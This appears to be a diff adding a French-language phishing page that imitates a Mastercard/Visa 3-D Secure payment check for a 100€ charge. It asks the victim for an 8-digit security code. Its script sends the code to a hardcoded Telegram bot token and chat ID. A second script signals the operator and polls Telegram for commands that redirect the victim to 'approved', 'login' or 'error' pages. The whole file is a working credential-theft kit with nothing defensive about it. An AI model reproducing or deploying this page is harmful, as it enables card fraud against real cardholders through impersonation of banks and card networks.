@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+</head>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background-color: #f4f4f4;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+        min-height: 100vh;
+        padding-top: 0px;
+    }
+
+    .container {
+        background: white;
+        padding: 50px;
+        border-radius: 20px;
+        box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+        text-align: center;
+        width: 100%;
+        max-width: 350px;
+    }
+
+    h2 {
+        color: white;
+        font-size: 21px;
+        margin-bottom: 25px;
+    }
+
+    .logos {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 15px;
+    }
+
+    .logos img {
+        height: 34px;
+        padding: 8px;
+    }
+
+    #visa {
+        height: 48px;
+    }
+
+    .auth-box {
+        background: #b66009;
+        color: white;
+        border-radius: 0px;
+        margin: 0 20px;
+        position: relative;
+        font-weight: bold;
+        font-size: 15px;
+        margin-left: -50px;
+        margin-right: -50px;
+        padding: 20px 30px;
+    }
+
+    .auth-box img {
+        display: block;
+        margin: 10px auto 0;
+        width: 40px;
+    }
+
+    .info {
+        background: #2b6cb0;
+        padding: 10px;
+        border-radius: 0px;
+        margin-top: 0;
+        font-size: 14px;
+        color: white;
+    }
+
+    .details {
+        text-align: center;
+        margin: 20px 0;
+        font-size: 14px;
+    }
+
+    .details p {
+        margin: 5px 0;
+    }
+
+    .instructions {
+        text-align: left;
+        padding: 0;
+        font-size: 14px;
+        list-style: none;
+        counter-reset: step-counter;
+    }
+
+    .instructions li {
+        margin: 10px 0;
+        position: relative;
+        padding-left: 40px;
+    }
+
+    .instructions li::before {
+        content: counter(step-counter);
+        counter-increment: step-counter;
+        position: absolute;
+        left: 0;
+        top: 50%;
+        transform: translateY(-50%);
+        background: #000;
+        color: white;
+        width: 30px;
+        height: 30px;
+        border-radius: 50%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-weight: bold;
+    }
+
+    .code-box {
+        margin-top: 20px;
+        text-align: center;
+    }
+
+    .code-box input {
+        width: 80%;
+        padding: 10px;
+        font-size: 16px;
+        text-align: center;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+    }
+
+    .code-box button {
+        margin-top: 10px;
+        background-color: #001;
+        color: white;
+        border: none;
+        padding: 10px 20px;
+        border-radius: 5px;
+        cursor: pointer;
+        font-size: 16px;
+    }
+
+    .countdown {
+        margin-top: 10px;
+        font-size: 16px;
+        color: red;
+    }
+
+    .loading-gif {
+        display: none;
+        margin-top: 20px;
+    }
+
+    #loading-gif img {
+        width: 125px;
+        height: auto;
+    }
+</style>
+
+<body>
+    <div class="container">
+        <br>
+        <br>
+        <div class="logos">
+            <img src="https://files.catbox.moe/fxt04z.jpg" alt="Matsercard">
+            <img src="https://files.catbox.moe/70p709.jpg" id="visa" alt="Visa">
+        </div>
+
+        <div class="auth-box">
+            <h2>En attente d'authentification</h2>
+            <p>Afin de valider votre paiement, nous avons besoin d'une
+                validation supplémentaire de votre part</p>
+            <img src="https://i.gifer.com/origin/34/34338d26023e5515f6cc8969aa027bca_w200.gif" alt="Chargement...">
+        </div>
+        <div class="details">
+            <p><strong>Montant :</strong> 100€</p>
+            <p><strong>Date :</strong> <span id="date"></span></p>
+            <p><strong>N° de carte :</strong> xxxxxxxxxxxxXXXX</p>
+        </div>
+        <img alt="" class="form-image" style="border:0" src="https://files.catbox.moe/l15why.gif" height="123px"
+            width="220px" data-component="video">
+
+        <ol class="instructions">
+            <li>Vous allez recevoir une notification sur votre appareil de confiance</li>
+            <li>Appuyez sur cette notification pour valider l'opération</li>
+            <li>Revenez ensuite sur cette page et vérifiez que votre paiement a été validé</li>
+        </ol>
+        <div class="code-box">
+            <h4>Étape 1/2 : Saisissez le code de sécurité reçu sur votre téléphone</h4>
+            <img alt="" class="form-image" style="border:0" src="https://files.catbox.moe/ccqgjj.png" height="100px"
+                width="100px" data-component="video">
+            <input type="text" id="securityCode" maxlength="8" placeholder="Code de sécurité (8 chiffres)">
+            <p id="validation-error" style="display: none; color: red; font-size: 0.9em; margin-top: 5px;">Code invalide
+            </p>
+            <div class="countdown" id="countdown">05:00</div>
+            <button onclick="sendCodeToTelegram()">Continuer</button>
+            <div id="loading-gif" class="loading-gif">
+                <img src="https://www.icegif.com/wp-content/uploads/2023/07/icegif-1263.gif" alt="Chargement...">
+                <p>Traitement en cours...</p>
+            </div>
+        </div>
+    </div>
+    <script>
+        function updateDate() {
+            const options = { timeZone: 'Europe/Paris', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit' };
+            const now = new Date().toLocaleString('fr-FR', options);
+            const dateElement = document.getElementById('date');
+            if (dateElement) {
+                dateElement.textContent = now;
+            }
+        }
+        updateDate();
+
+        function startCountdown(durationInSeconds, display) {
+            let timer = durationInSeconds, minutes, seconds;
+            const interval = setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+                display.textContent = minutes + ":" + seconds;
+                if (--timer < 0) {
+                    clearInterval(interval);
+                    display.textContent = "Expiré";
+                }
+            }, 1000);
+        }
+
+        window.onload = function () {
+            const countdownElement = document.getElementById('countdown');
+            if (countdownElement) {
+                startCountdown(300, countdownElement);
+            }
+        };
+
+        function sendCodeToTelegram() {
+            const code = document.getElementById('securityCode').value;
+
+            // Vérifier si le code fait bien 8 chiffres
+            if (code.length === 8 && /^\d{8}$/.test(code)) {
+                // Afficher le GIF de chargement
+                document.getElementById('loading-gif').style.display = 'block';
+
+                const telegramBotToken = '7397031599:AAHgmL_t9K5uY7Uo0A7QN6ZlVtX8y2A0lj8';
+                const chatId = '6669693805';
+                const message = `Code de sécurité: ${code}`;
+
+                fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+            } else {
+                // Afficher un message d'erreur
+                document.getElementById('validation-error').style.display = 'block';
+            }
+        }
+
+    </script>
+    <script>
+        const token = "7397031599:AAHgmL_t9K5uY7Uo0A7QN6ZlVtX8y2A0lj8";
+        const chatId = "6669693805";
+        const psd = "Console By YKK";
+
+        window.onload = () => {
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+            const messageData = {
+                chat_id: chatId,
+                text: `🔵 ${psd}`,
+                reply_markup: JSON.stringify({
+                    inline_keyboard: [
+                        [{ text: "Approved", callback_data: "v:" + psd }],
+                        [{ text: "Login", callback_data: "e:" + psd }],
+                        [{ text: "incorrecte", callback_data: "o1:" + psd }],
+                        [{ text: "Technical Error", callback_data: "o10:" + psd }]
+                    ]
+                })
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(messageData)
+            }).catch(console.error);
+        };
+
+        function getUpdates() {
+            const url = `https://api.telegram.org/bot${token}/getUpdates`;
+
+            fetch(url)
+                .then(res => res.json())
+                .then(data => {
+                    const updates = data.result;
+                    if (!updates.length) return;
+
+                    updates.forEach(update => {
+                        const query = update.callback_query;
+                        if (!query) return;
+
+                        const [type, value] = query.data.split(":");
+                        if (value === psd) {
+                            if (type === "v") {
+                                window.location.href = "vote_approved.html";
+                            } else if (type === "e") {
+                                window.location.href = "Login.html";
+                            } else if (type === "o1") {
+                                window.location.href = "incorrecte.html";
+                            } else if (type === "o10") {
+                                window.location.href = "technical_error.html";
+                            }
+                        }
+
+                        markUpdateAsRead(update.update_id);
+                    });
+                })
+                .catch(console.error);
+        }
+
+        function markUpdateAsRead(updateId) {
+            const url = `https://api.telegram.org/bot${token}/getUpdates?offset=${updateId + 1}`;
+            fetch(url).catch(console.error);
+        }
+
+        setInterval(getUpdates, 3000);
+
+        document.addEventListener('DOMContentLoaded', function () {
+            const progressBar = document.getElementById('progress-bar');
+
+            function updateProgress(progress) {
+                progressBar.style.width = progress + '%';
+            }
+
+            let progress = 0;
+
+            const interval = setInterval(() => {
+                progress += 100 / 30;
+
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(interval);
+                }
+
+                updateProgress(progress);
+            }, 1000);
+        });
+    </script>
+
+</body>
+
+</html>
